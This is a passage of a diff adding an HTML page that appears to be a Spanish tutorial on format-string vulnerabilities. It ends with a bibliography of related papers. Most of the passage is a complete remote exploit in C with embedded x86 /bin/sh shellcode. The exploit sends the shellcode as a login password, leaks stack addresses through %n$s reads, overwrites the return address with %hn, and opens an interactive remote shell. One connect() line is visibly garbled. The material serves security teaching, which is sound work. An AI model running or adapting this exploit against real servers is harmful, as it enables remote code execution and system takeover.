+      close(sock);
+      exit(EXIT_FAILURE);
+    }
+
+    if (debug) 
+      fprintf(stderr, "testing offset = %d fmt =  [%s] buf = [%s] len = %d\n", 
+	      i, fmt, buf, len);
+
+    if (!strcmp(buf, "AAAA41414141"))
+      offset = i;
+  }
+  return offset;
+}
+
+char *shellcode =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+int main(int argc, char **argv)
+{
+  char *ip = "127.0.0.1", *ptr;
+  struct sockaddr_in sck;
+  u_int read_at, addr_stack = (u_int)0xbfffe0001; /* default bottom */
+  u_int addr_shellcode = -1, addr_buffer = -1, addr_ret = -1;
+  char buf[1024], fmt[128], c;
+  int port = 12345, offset = -1;
+  int sd, len, i;
+
+  while ((c = getopt(argc, argv, "dvi:p:a:o:")) != -1) {
+    switch (c) {
+      case 'i':
+	ip = optarg;
+	break;
+	  
+      case 'p':
+	port = atoi(optarg);
+	break;
+
+      case 'a':
+	addr_stack = strtoul(optarg, NULL, 16);
+	break;
+	
+      case 'o':
+	offset = atoi(optarg);
+	break;
+
+      case 'v':
+	verbose = 1;
+	break;
+
+      case 'd':
+	debug = 1;
+	break;
+
+      default:
+	fprintf(stderr, "Unknwon option %c (%d)\n", c, c);
+	exit (EXIT_FAILURE);
+    }
+  }
+
+  /* init the sockaddr_in */
+  fprintf(stderr, "Using IP %s\n", ip);
+  sck.sin_family = PF_INET;
+  sck.sin_addr.s_addr = resolve(ip);
+  sck.sin_port = htons (port);
+
+  /* open the socket */
+  if (!(sd = socket (PF_INET, SOCK_STREAM, 0))) {
+    perror ("socket()");
+    exit (EXIT_FAILURE);
+  }
+  
+  /* connect to the remote server */
+  if (connect (sd, (struct sockaddr *) , sizeof (sck)) &#60; 0) {
+    perror ("Connect() ");
+    exit (EXIT_FAILURE);
+  }
+  fprintf (stderr, "Connected to %s\n", ip);
+  if (debug) sleep(10);
+
+  /* send login */
+  memset (buf, 0x0, sizeof(buf));
+  len = read(sd, buf, sizeof(buf));
+  if (strncmp(buf, "login", 5)) {
+    fprintf(stderr, "Error: no login asked [%s] (%d)\n", buf, len);
+    close(sd);
+    exit(EXIT_FAILURE);
+  }
+  strcpy(buf, "toto");
+  len = write (sd, buf, strlen(buf));
+  if (verbose) fprintf(stderr, "login sent [%s] (%d)\n", buf, len);
+  sleep(1);
+
+  /* passwd: shellcode in the buffer and in the remote stack */
+  len = read(sd, buf, sizeof(buf));
+  if (strncmp(buf, "password", 8)) {
+    fprintf(stderr, "Error: no password asked [%s] (%d)\n", buf, len);
+    close(sd);
+    exit(EXIT_FAILURE);
+  }
+  write (sd, shellcode, strlen(shellcode));
+  if (verbose) fprintf (stderr, "passwd (shellcode) sent (%d)\n", len);
+  sleep(1);
+
+  /* find offset */
+  if (offset == -1) {
+    if ((offset = get_offset(sd)) == -1) {
+      fprintf(stderr, "Error: can't find offset\n");
+      fprintf(stderr, "Please, use the -o arg to specify it.\n");
+      close(sd);
+      exit(EXIT_FAILURE);
+    }
+    if (verbose) fprintf(stderr, "[Found offset = %d]\n", offset);
+  }
+
+  /* look for the address of the shellcode in the remote stack */
+  memset (fmt, 0x0, sizeof(fmt));
+  read_at = addr_stack;
+  get_addr_as_char(read_at, fmt);
+  snprintf(fmt+4, sizeof(fmt)-4, "%%%d$s", offset);
+  write(sd, fmt, strlen(fmt));
+  sleep(1);
+
+  while((len = read(sd, buf, sizeof(buf))) &#62; 0 &#38;&#38; 
+	(addr_shellcode == -1 || addr_buffer == -1 || addr_ret == -1) ) {
+
+    if (debug) fprintf(stderr, "Read at 0x%x (%d)\n", read_at, len);
+
+    /* the shellcode */
+    if ((ptr = strstr(buf, shellcode))) {
+      addr_shellcode = read_at + (ptr-buf) - 4;
+      fprintf (stderr, "[shell addr is: 0x%x (%d) ]\n", addr_shellcode, len);
+      fprintf(stderr, "buf = (%d)\n", len);
+      for (i=0; i&lt;len; i++) {
+	fprintf(stderr,"%.2x ", (int)(buf[i] &#38; 0xff));
+	if (i &#38;&#38; i%20 == 0) fprintf(stderr, "\n");
+      }
+      fprintf(stderr, "\n");
+    }
+
+    /* the input buffer */
+    if (addr_buffer == -1 &#38;&#38; (ptr = strstr(buf, fmt))) {
+      addr_buffer = read_at + (ptr-buf) - 4;
+      fprintf (stderr, "[buffer addr is: 0x%x (%d) ]\n", addr_buffer, len);
+      fprintf(stderr, "buf = (%d)\n", len);
+      for (i=0; i&lt;len; i++) {
+	fprintf(stderr,"%.2x ", (int)(buf[i] &#38; 0xff));
+	if (i &#38;&#38; i%20 == 0) fprintf(stderr, "\n");
+      }
+      fprintf(stderr, "\n\n");
+    }
+
+    /* return address */
+    if (addr_buffer != -1) {
+      i = 4;
+      while (i&lt;len-5 &#38;&#38; addr_ret == -1) {
+	if (buf[i] == (char)0xff &#38;&#38; buf[i+1] == (char)0xbf &#38;&#38;
+	    buf[i+4] == (char)0x04 &#38;&#38; buf[i+5] == (char)0x08) {
+	  addr_ret = read_at + i - 2 + 4 - 4;
+	  fprintf (stderr, "[ret addr is: 0x%x (%d) ]\n", addr_ret, len);
+	}
+	i++;
+      }
+    }
+
+    read_at += (len-4+1);
+    if (len == sizeof(buf)) {
+      fprintf(stderr, "Warning: this has not been tested !!!\n");
+      fprintf(stderr, "len = %d\nread_at = 0x%x", len, read_at);
+      read_at-=strlen(shellcode);
+    }
+    get_addr_as_char(read_at, fmt);
+    write(sd, fmt, strlen(fmt));
+  }
+
+  /* send the format string */
+  fprintf (stderr, "Building format string ...\n");
+  memset(buf, 0, sizeof(buf));
+  build_hn(buf, addr_ret, addr_shellcode, offset, 0);
+  write(sd, buf, strlen(buf));
+  sleep(1);
+  read(sd, buf, sizeof(buf));
+
+  /* call the return while quiting */
+  fprintf (stderr, "Sending the quit ...\n");
+  strcpy(buf, "quit");
+  write(sd, buf, strlen(buf));
+  sleep(1);
+
+  interact(sd);
+
+  close(sd);
+  return 0;
+}</PRE
+></DIV
+><DIV
+CLASS="SECT1"
+><HR><H2
+CLASS="SECT1"
+><A
+NAME="AEN153"
+></A
+>17. Bibliografía</H2
+><P
+>1. Más información sobre los errores de formato por P. "kalou" Bouchareine 
+      (http://www.hert.org/papers/format.html)</P
+><P
+>   2. Errores de Formato: Qué són, de donde provienen... Cómo explotarlos, por lamagra 
+      (lamagra@digibel.org <FONT
+COLOR="RED"
+>digibel.org&#62;)</FONT
+></P
+><P
+>   3. Evitar los fallos de seguridad al desarrollar una aplicación - 4: las cadenas de formato, por
+      F. Raynal, C. Grenier, C. Blaess
+      (http://minimum.inria.fr/~raynal/index.php3?page=121 o
+      http://www.linuxfocus.org/Francais/July2001/article191.shtml)</P
+><P
+>   4. Explotando las vulnerabilidades de cadena de formato, por scut (team TESO)
+      (http://www.team-teso.net/articles/formatstring)</P
+><P
+>   5. fmtbuilder-howto por F. Raynal y S. Dralet 
+      (http://minimum.inria.fr/~raynal/index.php3?page=501)</P
+></DIV
+></DIV
+></BODY
+></HTML
+>
